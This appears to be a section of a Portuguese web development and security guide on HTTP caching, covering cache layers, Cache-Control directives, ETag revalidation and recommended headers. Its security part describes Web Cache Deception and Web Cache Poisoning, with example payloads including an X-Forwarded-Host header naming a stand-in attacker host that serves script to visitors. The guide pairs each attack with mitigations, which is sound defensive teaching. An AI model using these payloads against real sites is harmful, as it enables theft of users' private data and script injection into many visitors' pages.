Buscar recursos pela rede é uma das operações mais caras e lentas de uma aplicação web (envolve resolução DNS, handshake TCP, negociação TLS e latência física até o servidor). O **cache** resolve esse gargalo armazenando cópias de respostas anteriores para reutilizá-las em requisições futuras, mas exige configuração rigorosa para não entregar dados desatualizados nem **vazar dados privados de um usuário para outro**.

<a id="s1-13-1"></a>
#### 1.13.1 Funcionamento e camadas de cache

**O que é:** o sistema de cache da web (padronizado na **RFC 9111 — *HTTP Caching***) é uma arquitetura em múltiplas camadas — algumas dentro do próprio navegador e outras na infraestrutura de rede — que intercepta requisições e responde com cópias armazenadas sempre que as regras de frescor (*freshness*) e validação permitirem.

**Para que serve:** reduzir drasticamente a latência percebida pelo usuário (tempo de carregamento perto de 0 ms para caches locais), economizar franquia de dados móveis e diminuir a carga de CPU e banda nos servidores de origem.

**Como funciona (Camadas de Cache no Navegador e na Rede):**

Quando o navegador precisa carregar um recurso, ele consulta suas camadas internas na seguinte ordem de precedência:

1. **Memory Cache (Cache de Memória RAM — exibido como `(memory cache)` na aba Network):**
   - Armazena recursos já carregados na aba/sessão atual diretamente na memória RAM (imagens, scripts, fontes, folhas de estilo).
   - **Tempo de resposta:** praticamente **0 ms**.
   - **Ciclo de vida:** volátil; é descartado quando a aba ou o processo do navegador é fechado.
2. **Service Worker Cache Storage (exibido como `(ServiceWorker)` na aba Network):**
   - Controlado programaticamente pelo desenvolvedor via JavaScript através da **Cache API** (`caches.open()`, `cache.match()`, `cache.put()`) dentro de um Service Worker ([Seção 2.2](./02b-devtools-application.md#s2-2)).
   - Intercepta o evento `fetch` antes que a requisição chegue ao cache HTTP de disco ou à rede, permitindo estratégias como *Cache First*, *Network First* ou *Stale-While-Revalidate*.
3. **Disk Cache / HTTP Cache (Cache de Disco — exibido como `(disk cache)` na aba Network):**
   - Persistido no disco rígido/SSD do dispositivo e governado estritamente pelos headers HTTP da **RFC 9111** (`Cache-Control`, `ETag`, `Last-Modified`, `Vary`).
   - **Nota de Segurança Moderna (*HTTP Cache Partitioning*):** desde 2020, o Chrome e os demais navegadores modernos **particionam o cache HTTP de disco pelo site de nível superior (*top-level site*)** **[Varia por versão]**. Se `site-a.test` e `site-b.test` carregarem o mesmo `https://cdn.exemplo.test/lib.js`, cada um terá sua própria entrada no cache de disco. Isso impede ataques de *Cross-Site Timing / XS-Leaks* (em que um site malicioso media se uma imagem ou script de outro site carregava em 1 ms para descobrir se o usuário havia visitado aquele site recentemente!).
4. **Push / Preload / Prefetch Cache:**
   - Recursos pré-carregados para a navegação atual (`<link rel="preload">`, mantidos apenas enquanto o documento carrega) ou pré-buscados para a próxima navegação provável (`<link rel="prefetch">`, exibidos como `(prefetch cache)`).
5. **Back/Forward Cache (`bfcache`):**
   - Diferente do cache HTTP de arquivos individuais, o **`bfcache`** tira um **instantâneo completo da página inteira em memória** (incluindo a árvore DOM e o estado de execução do JavaScript no *Heap*) quando o usuário navega para fora da página. Se o usuário clicar nos botões **Voltar** ou **Avançar** do navegador, a página inteira é restaurada instantaneamente sem fazer requisições de rede! *(Observação: respostas com `Cache-Control: no-store` em conexões HTTPS podem impedir o uso do `bfcache`, razão pela qual o DevTools possui uma ferramenta dedicada para testar elegibilidade ao `bfcache` na aba Application — [Seção 2.2.8](./02b-devtools-application.md#s2-2)).*

##### Caches Privados vs. Caches Compartilhados (Distinção crítica para Segurança)

| Tipo de Cache | Onde fica | Quem acessa as respostas salvas | Diretiva `Cache-Control` associada |
|---|---|---|---|
| **Cache Privado (*Private Cache*)** | Dentro do navegador de um único usuário (Memory Cache e Disk Cache) | Apenas aquele navegador/perfil local | `Cache-Control: private` |
| **Cache Compartilhado (*Shared Cache*)** | Proxies reversos (Nginx, Varnish), CDNs (Cloudflare, CloudFront, Akamai, Fastly) e proxies corporativos | **Múltiplos usuários diferentes!** Se uma resposta privada parar aqui, vaza para outros clientes! | `Cache-Control: public` (ou `s-maxage`) |

---

<a id="s1-13-2"></a>
#### 1.13.2 Controle e validação de cache

**O que é:** é o conjunto de diretivas do header **`Cache-Control`** e de validadores condicionais (`ETag` e `Last-Modified`) pelos quais o servidor instrui navegadores e CDNs sobre **se**, **onde** e **por quanto tempo** uma resposta pode ser guardada, e como verificar se ela mudou.

**Como funciona:**

##### 1. Diretivas do Header `Cache-Control` (RFC 9111)

| Diretiva | Significado Técnico Exato | Quando utilizar |
|---|---|---|
| **`no-store`** | **Proíbe terminantemente** qualquer cache (privado ou compartilhado) de gravar qualquer parte da requisição ou da resposta em memória persistente ou disco. | **[REQUISITO] Dados sensíveis, financeiros, pessoais (PII) e respostas autenticadas críticas.** |
| **`no-cache`** | **PEGADINHA DE PROVA:** **NÃO** significa "não guardar em cache"! Significa que o cache **pode armazenar** a resposta, mas **não pode reutilizá-la sem antes revalidar com o servidor de origem** (enviando `If-None-Match` / `If-Modified-Since`). | Páginas HTML ou documentos que mudam com frequência, mas cujo corpo você quer economizar via `304 Not Modified` quando não houver alteração. |
| **`private`** | Indica que a resposta é destinada a um único usuário e **só pode ser armazenada em caches privados (navegador)**; proíbe o armazenamento em CDNs e proxies compartilhados. | Páginas personalizadas por usuário que não contenham segredos críticos (ex.: avatar ou preferências do usuário). |
| **`public`** | Permite que a resposta seja armazenada por **qualquer cache**, inclusive CDNs e proxies compartilhados. | Arquivos estáticos públicos (imagens, CSS, JS, fontes, páginas institucionais abertas). |
| **`max-age=<N>`** | Define o tempo de vida útil (*freshness lifetime*) em **segundos** a partir da geração da resposta (ex.: `max-age=3600` = 1 hora; `max-age=31536000` = 1 ano). | Qualquer recurso cacheável. Enquanto estiver "fresco" (*fresh*), o navegador usa o cache sem contatar o servidor. |
| **`s-maxage=<N>`** | Funciona como `max-age`, mas aplica-se **exclusivamente a caches compartilhados (CDNs/proxies)**, sobrescrevendo `max-age` para eles. | Quando você quer que a CDN guarde por 1 hora (`s-maxage=3600`), mas o navegador do cliente revalide sempre (`max-age=0`). |
| **`must-revalidate`** | Enquanto estiver fresca (`< max-age`), usa o cache normalmente; porém, **assim que expirar (*stale*)**, proíbe o cache de servir a cópia vencida sem revalidar com o servidor de origem (mesmo se a rede estiver instável). | Recursos cuja validade temporal precisa ser respeitada rigorosamente. |
| **`immutable`** | Informa ao navegador que o conteúdo daquele arquivo **jamais mudará** enquanto estiver fresco, evitando que o navegador envie requisições condicionais (`304`) mesmo quando o usuário aperta `F5` (recarregar). | **Arquivos estáticos com hash no nome (*cache busting*)**, como `/assets/app.9f8e7d6c.js` ou `/assets/style.a1b2c3d4.css`. |

*(Nota: os headers `Expires: <data HTTP>` e `Pragma: no-cache` são mecanismos legados do HTTP/1.0; quando `Cache-Control` está presente, suas diretivas têm precedência sobre `Expires`.)*

##### 2. Revalidação Condicional (`ETag` / `If-None-Match` e `Last-Modified` / `If-Modified-Since`)

Quando uma resposta guardada em cache tem `Cache-Control: no-cache` ou seu `max-age` expirou (*stale*), o navegador não precisa baixar o arquivo inteiro novamente se ele não tiver mudado no servidor. Ele faz uma **Requisição Condicional**:

1. **Via `ETag` (Entity Tag — Identificador de versão / Hash do conteúdo, preferencial e mais preciso):**
   - Na 1ª resposta (`200 OK`), o servidor envia `ETag: "v2-8f3a9c21"`.
   - Na requisição seguinte, o navegador envia automaticamente `If-None-Match: "v2-8f3a9c21"`.
2. **Via Data de Modificação (`Last-Modified`, fallback menos preciso — resolução de 1 segundo):**
   - Na 1ª resposta (`200 OK`), o servidor envia `Last-Modified: Fri, 30 Oct 2026 10:00:00 GMT`.
   - Na requisição seguinte, o navegador envia automaticamente `If-Modified-Since: Fri, 30 Oct 2026 10:00:00 GMT`.
3. **Decisão do Servidor:**
   - Se o arquivo **mudou**, o servidor responde **`200 OK`** com o arquivo novo completo e a nova `ETag`.
   - Se o arquivo **NÃO mudou**, o servidor responde **`304 Not Modified`** **SEM CORPO DE RESPOSTA** (apenas cabeçalhos!). O navegador reaproveita os bytes que já estavam no disco e renova a validade do cache!

**Exemplo prático (Fluxo de Revalidação `304 Not Modified`):**

```http
# 1ª Requisição (Cache vazio):
GET /index.html HTTP/1.1
Host: loja-ficticia.test

# 1ª Resposta (200 OK — 45 KB transferidos):
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: private, no-cache, must-revalidate
ETag: "653f8a-1b2c3d"
Last-Modified: Fri, 30 Oct 2026 10:00:00 GMT
Content-Length: 46080

<!DOCTYPE html><html>... (46080 bytes)
```

```http
# 2ª Requisição (Usuário recarrega a página -> navegador revalida com If-None-Match):
GET /index.html HTTP/1.1
Host: loja-ficticia.test
If-None-Match: "653f8a-1b2c3d"
If-Modified-Since: Fri, 30 Oct 2026 10:00:00 GMT

# 2ª Resposta (Arquivo não mudou -> 304 Not Modified, ZERO bytes de corpo transferidos!):
HTTP/1.1 304 Not Modified
Cache-Control: private, no-cache, must-revalidate
ETag: "653f8a-1b2c3d"
```

---

<a id="s1-13-3"></a>
#### 1.13.3 Problemas de segurança em cache e configuração segura

##### 1. Cacheamento de dados sensíveis em computadores compartilhados ou CDNs

Se um endpoint como `GET /api/v1/meu-extrato` ou a página HTML `/minha-conta` não enviar headers restritivos de cache (ou enviar `Cache-Control: public, max-age=600` por erro de configuração global):
- **No computador compartilhado:** mesmo após fechar a aba, os dados bancários ou pessoais ficam gravados em texto claro na pasta do **Disk Cache** do navegador, podendo ser lidos pela próxima pessoa que usar o computador (inclusive apertando o botão Voltar ou inspecionando o cache).
- **Na CDN / Proxy Reverso:** a CDN armazena a resposta do Usuário A e a entrega diretamente para o Usuário B, C e D que acessarem a mesma URL, causando vazamento massivo de dados pessoais!

##### 2. Web Cache Deception (Decepção de Cache Web)

Ocorre quando há uma divergência entre como o **servidor de aplicação** interpreta a URL e como a **CDN (cache compartilhado)** interpreta a mesma URL:
1. A CDN está configurada com uma regra ingênua: *"Qualquer URL que termine com `.css`, `.js`, `.png` ou `.ico` é um arquivo estático público — faça cache público por 1 dia ignorando cookies!"*.
2. O framework do servidor de aplicação (ou roteador mal configurado) ignora parâmetros de caminho extras: ao receber `GET /minha-conta/dados-pessoais/estilo.css`, o servidor resolve a rota `/minha-conta/dados-pessoais` e retorna `200 OK` com o JSON/HTML confidencial do usuário logado!
3. **O ataque:** o atacante envia para a vítima logada um link (ou imagem `<img src="https://loja-ficticia.test/minha-conta/dados-pessoais/avatar.png">`). O navegador da vítima faz a requisição autenticada; o servidor devolve os dados privados da vítima; a CDN vê o final `.png` e **salva os dados privados da vítima no cache público**. Em seguida, o atacante acessa a mesma URL sem estar logado e lê os dados da vítima direto da CDN!

##### 3. Web Cache Poisoning (Envenenamento de Cache Web)

No *Web Cache Poisoning*, o objetivo do atacante não é roubar a resposta de uma vítima, mas sim **fazer a CDN armazenar uma resposta maliciosa (contendo XSS ou redirecionamento) e servi-la para milhares de usuários legítimos**:
1. Para decidir se duas requisições pedem o mesmo arquivo, a CDN usa uma **Chave de Cache (*Cache Key*)**, geralmente composta apenas por `Método + Host + Caminho + Query String`.
2. Porém, o servidor de aplicação lê **entradas não incluídas na chave de cache (*unkeyed inputs*)**, como headers `X-Forwarded-Host`, `X-Forwarded-Scheme` ou `X-Original-URL`, e reflete esse valor dentro do HTML (ex.: `<script src="https://VALOR_DO_X_FORWARDED_HOST/app.js"></script>`).
3. **O ataque:** o atacante envia uma requisição `GET /home?cb=1` com `X-Forwarded-Host: atacante.test` no momento em que o cache da CDN expira. O servidor gera o HTML apontando para `https://atacante.test/app.js` e a CDN armazena essa resposta envenenada para a chave `GET /home`. Todos os visitantes seguintes que acessarem `/home` receberão o script do atacante direto da CDN!

##### Configuração segura e Políticas Recomendadas por Tipo de Conteúdo

| Tipo de Recurso / Endpoint | Header `Cache-Control` Recomendado | Por que é seguro e eficiente? |
|---|---|---|
| **APIs autenticadas, dados pessoais (PII), checkout, extratos, tokens** | **[REQUISITO]** `Cache-Control: no-store, private` *(+ `Pragma: no-cache` se houver clientes HTTP/1.0 legados)* | Proíbe gravação tanto no disco do navegador quanto em qualquer CDN ou proxy intermediário. |
| **Páginas HTML dinâmicas públicas ou cascas de SPA (`index.html`)** | **[RECOMENDAÇÃO]** `Cache-Control: no-cache, must-revalidate` (com `ETag`) | Garante que o usuário sempre verifique se saiu uma versão nova do `index.html`, mas aproveita `304 Not Modified` quando nada mudou. |
| **Assets estáticos versionados com hash no nome (`app.8f3a9c.js`, `logo.d4e5f6.png`)** | **[BOA PRÁTICA]** `Cache-Control: public, max-age=31536000, immutable` | Máxima performance: fica 1 ano no navegador e na CDN sem revalidar. Quando o código mudar, o build gera um novo hash no nome do arquivo (`app.1a2b3c.js`) e o `index.html` passa a apontar para ele! |
| **Assets estáticos públicos sem hash no nome (`favicon.ico`, `robots.txt`)** | `Cache-Control: public, max-age=86400, stale-while-revalidate=3600` | Faz cache por 1 dia com atualização suave em segundo plano. |

- **[REQUISITO]** Contra **Web Cache Deception**: configurar o roteador do servidor para retornar `404 Not Found` para sufixos de caminho inexistentes (nunca servir `/minha-conta` quando pedirem `/minha-conta/x.css`), exigir que a CDN respeite o header `Cache-Control: no-store, private` do servidor de origem (*Origin Cache Control*) e nunca fazer cache de respostas que contenham `Set-Cookie` ou venham de requisições com `Authorization`.
- **[REQUISITO]** Contra **Web Cache Poisoning**: desabilitar ou ignorar no servidor headers não confiáveis como `X-Forwarded-Host` e `X-Original-URL` (ou sobrescrevê-los estritamente no proxy reverso de borda) e incluir no header **`Vary`** qualquer header de requisição que altere o conteúdo da resposta (ex.: `Vary: Origin, Accept-Encoding`).
- **[BOA PRÁTICA]** No endpoint de logout (`POST /logout`), enviar o header `Clear-Site-Data: "cache", "cookies", "storage"` para instruir o navegador a expurgar imediatamente o cache local do usuário.

---

---

> [⬅️ 1A. Fundamentos Web (1.1 a 1.6)](./01a-fundamentos-web-parte1.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [2.1 Chrome DevTools — Aba Network ➡️](./02a-devtools-network.md)
